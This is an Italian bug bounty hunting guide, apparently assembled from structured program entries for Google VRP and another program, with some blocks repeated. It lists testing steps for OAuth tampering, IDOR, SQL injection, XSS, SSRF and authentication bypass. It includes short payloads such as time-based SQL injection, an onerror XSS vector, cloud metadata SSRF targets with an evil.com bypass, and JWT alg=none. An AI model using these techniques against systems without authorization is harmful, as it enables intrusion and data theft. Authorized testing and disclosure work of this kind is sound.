steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp

testingTechniques.name: OAuth Flow Analysis
testingTechniques.description: Google usa OAuth 2.0 pesantemente, molti bug storici sono qui
steps: Intercetta il flusso OAuth con Burp
Modifica redirect_uri, client_id, scope, state
Testa open redirect in redirect_uri
Verifica token leak in referer header
Testa PKCE bypass su mobile app

testingTechniques.name: Cross-Product IDOR
testingTechniques.description: Un account Google da accesso a 20+ prodotti: cerca IDOR cross-service
steps: Crea risorsa in Drive / Photos / Calendar
Cattura l'ID della risorsa
Prova ad accedere da account Google diverso
Verifica permessi di condivisione
Testa Google Docs shared con link pubblici

reportingSteps: 1. Usa Google Issue Tracker (issuetracker.google.com) con tag VRP
2. Includi: Title, Target, Summary, Steps, PoC, Impact, Suggested Fix
3. Aspetta triage (fino a 2 settimane, ma critici sono veloci)
4. Rispondi solo se chiedono chiarimenti, non insistere
5. Google NON rilascia CVE per ogni bug, ma conferma il fix
6. Il pagamento avviene tramite Google BugHunter University rewards
quickStartGuide: Step 1: Vai su bughunters.google.com e studia il program policy
Step 2: Iscriviti a Google BugHunter University (gratuita, con certificati)
Step 3: Inizia da Google Docs/Sheets: hanno molti bug di business logic
Step 4: Studia il flusso OAuth: la maggior parte dei bug Google sono qui
Step 5: Testa cross-product: un bug in Drive impatta anche Photos/Gmail
Step 6: Usa Google stesso per enumerarsi: dorks come site:*.google.com inurl:admin
Step 7: Leggi il blog di Project Zero per capire la qualità attesa
Step 8: Sii paziente: Google VRP è molto competitivo
tips: 💡 Google VRP è IL programma più competitivo: 100+ hunter esperti al giorno
💡 Concentrati su prodotti meno battuti: Google Fit, Google Chat, Cloud Console
💡 I bug accettati sono spesso catene: 2-3 low = 1 high
💡 Studia i writeup su Project Zero: mostrano lo standard qualitativo
💡 Il reverse engineering di app mobile Google è spesso fruttuoso
💡 Google Docs/Sheets collaborative editing ha avuto decine di RCE storici
💡 Account multipli sono essenziali: crea 5-10 account Google per test
💡 Non riportare bug in vendor di terze parti (es. problema in libreria JS)
💡 Il triage è lento, non scoraggiarti se non rispondono in 2 settimane

Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su dropbox
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK
